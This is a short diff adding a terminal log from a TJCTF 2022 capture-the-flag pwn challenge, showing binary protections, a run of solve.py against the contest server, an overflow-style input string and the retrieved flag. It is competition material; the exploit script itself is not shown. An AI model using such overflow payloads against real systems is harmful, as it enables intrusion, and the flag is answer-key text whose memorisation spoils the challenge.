@@ -1,0 +1,13 @@
+mito@ubuntu:~/CTF/TJCTF_2022/Pwn_favorite-color$ python solve.py r
+[*] '/home/mito/CTF/TJCTF_2022/Pwn_favorite-color/chall'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to tjc.tf on port 31453: Done
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2T4AA4T2 (50, 84, 52) is a pretty cool color... but it's not as cool as purple (50, 84, 52)...
+oh wait...
+it seems as if they're the same...
+here's a flag: tjctf{i_l1k3_gr3y_a_l0t_f49ad3}
